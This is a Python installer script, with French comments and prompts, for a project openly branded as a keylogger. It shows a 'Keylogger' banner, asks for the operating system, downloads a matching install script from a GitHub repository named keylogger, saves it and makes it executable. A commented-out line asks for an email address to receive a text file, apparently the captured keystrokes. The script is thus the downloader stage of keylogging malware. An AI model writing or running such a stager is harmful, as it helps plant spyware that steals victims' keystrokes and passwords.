import time
import os

os.system("pip install requests")
print("Veuillez patienter quelques secondes")
time.sleep(5)


import requests
if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")

#---------DÉBUT AFFICHAGE DU NOM-----------------------
def print_keylogger():
    keylogger_art = r"""
     _  __           _                                      
    | |/ /          | |                                     
    | ' / ___  _ __ | | ___  ___   __ _  __ _  ___ _ __ ___  
    |  < / _ \| '_ \| |/ _ \/ __| / _` |/ _` |/ _ \ '__/ _ \ 
    | . \ (_) | |_) | |  __/\__ \| (_| | (_| |  __/ | | (_) |
    |_|\_\___/| .__/|_|\___||___(_)__,_|\__, |\___|_|  \___/ 
             | |                        __/ |               
             |_|                       |___/                
    """

    for line in keylogger_art.splitlines():
        print(line)
        time.sleep(0.3)

print_keylogger()

#----------FIN AFFICHAGE DU NOM-------------------


#----------DÉBUT RÉCOLTE INFOS DES MACHINES----------------

systemeExploitation = int(input("Êtes-vous sur windows ou linux ? Tapez 1 pour windows ou 2 pour linux\n"))

while systemeExploitation!=1 and systemeExploitation!=2:
    systemeExploitation = int(input("Veuillez choisir 1 pour windows ou 2 pour linux"))

#mail = str(input("Veuillez écrire votre mail pour recevoir le fichier txt dessus : "))

if systemeExploitation==1:
    url="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_File_System/install_FileSystemWindows.py"
    filename='install_FileSystemWindows.py'
else:
    url="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_File_System/install_FileSystemLinux.py"
    filename='install_FileSystemLinux.py'

#-----------FIN RÉCOLTE INFOS DES MACHINES---------------



#-----------DÉBUT INSTALLATION DU BON FICHIER---------------


response = requests.get(url)

if response.status_code == 200:
    # Sauvegarder le fichier localement
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(response.text)

    print(f'Le fichier {filename} a été téléchargé avec succès.')
    os.system('chmod +x ' + filename)

#----------FIN INSTALLATION DU BON FICHIER-----------------
